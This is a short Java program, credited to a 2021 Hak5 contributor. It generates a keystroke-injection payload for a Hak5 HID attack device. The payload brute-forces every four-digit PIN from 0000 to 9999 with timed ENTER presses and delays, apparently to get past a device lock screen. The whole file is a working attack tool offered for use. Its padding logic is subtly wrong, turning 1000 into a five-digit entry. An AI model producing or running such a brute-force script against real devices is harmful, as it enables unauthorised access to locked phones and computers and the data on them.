import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class Generate {

	public static void main(String[] args) throws IOException {
		
		/* Written by MorkBorlog 2021 for Hak5.org */
		FileWriter fw = new FileWriter("payload.txt");
		BufferedWriter bw = new BufferedWriter(fw);
		
		bw.write("LED R");
		bw.write('\n');
		bw.write("ATTACKMODE HID");
		bw.write('\n');
		bw.write('\n');
		
		for(int i = 0; i < 10000; i++) {
			bw.write("Q ENTER\n");
			
			if(i >= 0 & i < 10) {
				bw.write("Q STRING 000" + Integer.toString(i) + '\n');
			} else if (i >= 10 & i < 100) {
				bw.write("Q STRING 00" + Integer.toString(i) + '\n');
			} else if(i >= 100 & i <= 1000) {
				bw.write("Q STRING 0" + Integer.toString(i) + '\n');
			} else {
				bw.write("Q STRING " + Integer.toString(i) + '\n');
			}
			
			bw.write("Q ENTER\n");
			bw.write("Q DELAY 5000\n");
			bw.write("Q ENTER\n");
			bw.write("Q DELAY 5000\n");
			bw.write("Q ENTER\n");
			bw.write("Q DELAY 5000\n");
			bw.write("Q ENTER\n");
			bw.write("Q DELAY 5000\n");
			bw.write("Q ENTER\n");
			bw.write("Q DELAY 5000\n");
			bw.write("Q ENTER\n");
			bw.write("Q DELAY 5000\n");
			bw.write("Q ENTER\n");
		}
		
		bw.write("\nLED G");
		
		bw.close();
		fw.close();
	}

}
